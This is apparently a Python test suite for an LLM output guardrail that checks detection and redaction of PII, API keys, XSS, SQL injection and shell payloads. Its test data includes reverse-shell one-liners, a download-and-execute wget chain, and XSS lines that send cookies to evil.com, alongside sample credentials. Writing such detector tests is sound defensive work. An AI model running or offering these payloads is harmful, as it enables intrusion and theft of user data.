"""
FEATURE #5-6 — Output PII Detection / XSS Payload Blocking
=============================================================
Phase 1: Test current state with unseen & hard data
Phase 2: Add 2026-standard advanced features
Phase 3: Heavy testing

Tests OutputValidator.validate_output() and sanitize_output() against:
- Real PII data (SSN, CC, emails, phones, API keys, JWT)
- XSS/SQLi/Shell injection payloads
- Obfuscated / encoded variants
- Edge cases and evasion techniques
"""
import sys, os, json, re, time
_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, _root)
sys.path.insert(0, os.path.join(_root, "guardian"))

from guardian.guardrails.output_validator import OutputValidator

RESULTS = {}


def run_test(name, fn):
    try:
        fn()
        RESULTS[name] = "PASS"
        print(f"  [PASS] {name}")
    except AssertionError as e:
        RESULTS[name] = f"FAIL: {e}"
        print(f"  [FAIL] {name}: {e}")
    except Exception as e:
        RESULTS[name] = f"ERROR: {type(e).__name__}: {e}"
        print(f"  [ERROR] {name}: {type(e).__name__}: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 1: PII Detection — Standard Patterns
# ═══════════════════════════════════════════════════════════════════════════════

def test_detects_email():
    ov = OutputValidator()
    assert not ov.validate_output("Contact john.doe@example.com for details")

def test_detects_ssn():
    ov = OutputValidator()
    assert not ov.validate_output("SSN is 123-45-6789")

def test_detects_credit_card():
    ov = OutputValidator()
    assert not ov.validate_output("Card: 4111 1111 1111 1111")

def test_detects_phone():
    ov = OutputValidator()
    assert not ov.validate_output("Call me at +1 (555) 123-4567")

def test_detects_openai_key():
    ov = OutputValidator()
    assert not ov.validate_output("Key: sk-proj-abcdefghijklmnopqrstuvwxyz123456789012345678")

def test_detects_aws_key():
    ov = OutputValidator()
    assert not ov.validate_output("AWS key: AKIAIOSFODNN7EXAMPLE")

def test_detects_ssh_key():
    ov = OutputValidator()
    assert not ov.validate_output("-----BEGIN RSA PRIVATE KEY-----\nMIIEpA...")

def test_detects_jwt():
    ov = OutputValidator()
    jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    assert not ov.validate_output(f"Token: {jwt}")

def test_detects_generic_password():
    ov = OutputValidator()
    assert not ov.validate_output("password = SuperSecret123!")

def test_safe_text_passes():
    ov = OutputValidator()
    assert ov.validate_output("The weather today is sunny and warm.")

def test_safe_code_passes():
    ov = OutputValidator()
    assert ov.validate_output("def hello():\n    return 'Hello, World!'")


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 2: XSS / SQLi / Shell Detection
# ═══════════════════════════════════════════════════════════════════════════════

def test_detects_xss_script():
    ov = OutputValidator()
    assert not ov.validate_output('<script>alert("XSS")</script>')

def test_detects_xss_javascript():
    ov = OutputValidator()
    assert not ov.validate_output('javascript:alert(document.cookie)')

def test_detects_sqli_drop_table():
    ov = OutputValidator()
    assert not ov.validate_output("DROP TABLE users")

def test_detects_sqli_union_select():
    ov = OutputValidator()
    assert not ov.validate_output("UNION SELECT username, password FROM users")

def test_detects_sqli_delete_from():
    ov = OutputValidator()
    assert not ov.validate_output("DELETE FROM customers WHERE id=1")

def test_detects_sqli_comment():
    ov = OutputValidator()
    assert not ov.validate_output("admin' OR '1'='1'; --")

def test_detects_reverse_shell_nc():
    ov = OutputValidator()
    assert not ov.validate_output("nc -e /bin/bash 10.0.0.1 4444")

def test_detects_reverse_shell_bash():
    ov = OutputValidator()
    assert not ov.validate_output("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 3: Redaction Quality
# ═══════════════════════════════════════════════════════════════════════════════

def test_redacts_email():
    ov = OutputValidator()
    result, detected = ov.sanitize_output("Email: john@example.com")
    assert "john@example.com" not in result, f"Email not redacted: {result}"
    assert "REDACTED" in result or "EMAIL" in result.upper()

def test_redacts_ssn():
    ov = OutputValidator()
    result, detected = ov.sanitize_output("SSN: 123-45-6789")
    assert "123-45-6789" not in result
    assert "REDACTED" in result

def test_redacts_openai_key():
    ov = OutputValidator()
    key = "sk-proj-abcdefghijklmnopqrstuvwxyz123456789012345678"
    result, detected = ov.sanitize_output(f"Key: {key}")
    assert key not in result

def test_redacts_multiple_pii():
    ov = OutputValidator()
    text = "Email: a@b.com, SSN: 123-45-6789, Phone: +1-555-123-4567"
    result, detected = ov.sanitize_output(text)
    assert "a@b.com" not in result
    assert "123-45-6789" not in result


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 4: Evasion / Obfuscation Resistance
# ═══════════════════════════════════════════════════════════════════════════════

def test_obfuscated_openai_key():
    ov = OutputValidator()
    # Separators inserted between chars
    assert not ov.validate_output("s k - p r o j - a b c d e f g h i j k l m n o p q r s t u v")

def test_xss_case_variation():
    ov = OutputValidator()
    assert not ov.validate_output('<ScRiPt>alert("xss")</sCrIpT>')

def test_sqli_case_variation():
    ov = OutputValidator()
    assert not ov.validate_output("dRoP tAbLe users")

def test_multiline_xss():
    ov = OutputValidator()
    payload = """Here is some content
<script>
document.cookie
</script>
More safe content"""
    assert not ov.validate_output(payload)

def test_embedded_in_markdown():
    ov = OutputValidator()
    payload = "```html\n<script>alert('xss')</script>\n```"
    assert not ov.validate_output(payload)


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 5: Hard Unseen Data — Real-World LLM Outputs
# ═══════════════════════════════════════════════════════════════════════════════

HARD_PII_OUTPUTS = [
    "Sure, here's the information: John Smith lives at 123 Main St. His SSN is 456-78-9012 and email is john.smith@company.com",
    "The API key for the production server is sk-live-abc123def456ghi789jkl012mno345pqr678stu901vwx",
    "I found the employee record: Name: Jane Doe, Phone: (212) 555-0147, Employee Code: EMP_123456",
    "The database credentials are: password = 'P@ssw0rd123!' and the connection string includes the JWT eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.dummysig",
    "Credit card ending in 4242: Full number is 4242424242424242, expiry 12/28",
    "The AWS secret access key is aws_secret_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEIODu3V0...\n-----END EC PRIVATE KEY-----",
    "Patient ID: MID-2026-AB, diagnosed with condition X. Contact: patient@hospital.org",
]

HARD_EXPLOIT_OUTPUTS = [
    '<img src=x onerror=alert(1)>',
    'javascript:void(document.location="http://evil.com/"+document.cookie)',
    "'; DROP TABLE users; --",
    "UNION SELECT password FROM admin_users WHERE '1'='1",
    "DELETE FROM audit_logs WHERE timestamp < NOW()",
    "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "nc -e /bin/sh 192.168.1.100 9999",
    '<svg onload="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">',
    "1; wget http://malware.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA",
]

SAFE_OUTPUTS = [
    "The capital of France is Paris.",
    "Here's a Python function:\n```python\ndef add(a, b):\n    return a + b\n```",
    "Machine learning is a subset of artificial intelligence.",
    "The HTTP status code 200 means the request was successful.",
    "React.js is a popular JavaScript library for building user interfaces.",
    "Climate change refers to long-term shifts in temperatures and weather patterns.",
    "To deploy to AWS, use `terraform apply` with the appropriate configuration.",
    "SELECT COUNT(*) FROM products WHERE price > 10.00",  # legitimate SQL, not an attack
]

def test_hard_pii_all_detected():
    """All hard PII outputs should be flagged."""
    ov = OutputValidator()
    missed = []
    for i, text in enumerate(HARD_PII_OUTPUTS):
        if ov.validate_output(text):
            missed.append(i)
    print(f"      PII detection: {len(HARD_PII_OUTPUTS) - len(missed)}/{len(HARD_PII_OUTPUTS)}")
    if missed:
        print(f"      MISSED indexes: {missed}")
    assert len(missed) == 0, f"Missed PII in outputs: {missed}"


def test_hard_exploits_all_detected():
    """All exploit outputs should be flagged."""
    ov = OutputValidator()
    missed = []
    for i, text in enumerate(HARD_EXPLOIT_OUTPUTS):
        if ov.validate_output(text):
            missed.append(i)
    print(f"      Exploit detection: {len(HARD_EXPLOIT_OUTPUTS) - len(missed)}/{len(HARD_EXPLOIT_OUTPUTS)}")
    if missed:
        for m in missed:
            print(f"        MISSED [{m}]: {HARD_EXPLOIT_OUTPUTS[m][:60]}")
    assert len(missed) == 0, f"Missed exploits: {missed}"


def test_safe_outputs_not_flagged():
    """Safe outputs should NOT be flagged (no false positives)."""
    ov = OutputValidator()
    flagged = []
    for i, text in enumerate(SAFE_OUTPUTS):
        if not ov.validate_output(text):
            flagged.append(i)
    print(f"      False positives: {len(flagged)}/{len(SAFE_OUTPUTS)}")
    if flagged:
        for f in flagged:
            print(f"        FP [{f}]: {SAFE_OUTPUTS[f][:60]}")
    assert len(flagged) == 0, f"False positives on safe outputs: {flagged}"


def test_hard_pii_redaction_quality():
    """Verify redaction actually removes PII from hard cases."""
    ov = OutputValidator()
    for text in HARD_PII_OUTPUTS[:4]:
        result, detected = ov.sanitize_output(text)
        # Original PII values should NOT appear in output
        emails = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", text)
        ssns = re.findall(r"\d{3}-\d{2}-\d{4}", text)
        for email in emails:
            assert email not in result, f"Email not redacted: {email}"
        for ssn in ssns:
            assert ssn not in result, f"SSN not redacted: {ssn}"


# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print("=" * 72)
    print("  FEATURE #5-6 — OUTPUT PII / XSS DETECTION")
    print("  Phase 1: Current State Test with Hard Unseen Data")
    print("=" * 72)

    print("\n  [1] PII Detection — Standard Patterns")
    run_test("detect_email",              test_detects_email)
    run_test("detect_ssn",               test_detects_ssn)
    run_test("detect_credit_card",       test_detects_credit_card)
    run_test("detect_phone",             test_detects_phone)
    run_test("detect_openai_key",        test_detects_openai_key)
    run_test("detect_aws_key",           test_detects_aws_key)
    run_test("detect_ssh_key",           test_detects_ssh_key)
    run_test("detect_jwt",              test_detects_jwt)
    run_test("detect_generic_password",  test_detects_generic_password)
    run_test("safe_text_passes",         test_safe_text_passes)
    run_test("safe_code_passes",         test_safe_code_passes)

    print("\n  [2] XSS / SQLi / Shell Detection")
    run_test("xss_script",              test_detects_xss_script)
    run_test("xss_javascript",          test_detects_xss_javascript)
    run_test("sqli_drop_table",         test_detects_sqli_drop_table)
    run_test("sqli_union_select",       test_detects_sqli_union_select)
    run_test("sqli_delete_from",        test_detects_sqli_delete_from)
    run_test("sqli_comment",            test_detects_sqli_comment)
    run_test("shell_nc",               test_detects_reverse_shell_nc)
    run_test("shell_bash",             test_detects_reverse_shell_bash)

    print("\n  [3] Redaction Quality")
    run_test("redact_email",            test_redacts_email)
    run_test("redact_ssn",             test_redacts_ssn)
    run_test("redact_openai_key",      test_redacts_openai_key)
    run_test("redact_multiple_pii",    test_redacts_multiple_pii)

    print("\n  [4] Evasion / Obfuscation Resistance")
    run_test("obfuscated_openai_key",  test_obfuscated_openai_key)
    run_test("xss_case_variation",     test_xss_case_variation)
    run_test("sqli_case_variation",    test_sqli_case_variation)
    run_test("multiline_xss",         test_multiline_xss)
    run_test("embedded_in_markdown",   test_embedded_in_markdown)

    print("\n  [5] Hard Unseen Data")
    run_test("hard_pii_all_detected",       test_hard_pii_all_detected)
    run_test("hard_exploits_all_detected",  test_hard_exploits_all_detected)
    run_test("safe_outputs_not_flagged",    test_safe_outputs_not_flagged)
    run_test("hard_pii_redaction_quality",  test_hard_pii_redaction_quality)

    passed = sum(1 for v in RESULTS.values() if v == "PASS")
    total = len(RESULTS)
    failed = {k: v for k, v in RESULTS.items() if v != "PASS"}
    
    print(f"\n{'='*72}")
    print(f"  RESULT: {passed}/{total} tests passed")
    if failed:
        print(f"\n  FAILURES ({len(failed)}):")
        for k, v in failed.items():
            print(f"    {k}: {v}")
    print(f"{'='*72}")

    out = os.path.join(os.path.dirname(__file__), "..", "artifacts", "evidence", "output_scanner_baseline.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w") as f:
        json.dump({"passed": passed, "total": total, "results": RESULTS, "failed": failed}, f, indent=2)
    print(f"\n  Saved: {os.path.abspath(out)}")
    return 0 if passed == total else 1


if __name__ == "__main__":
    sys.exit(main())
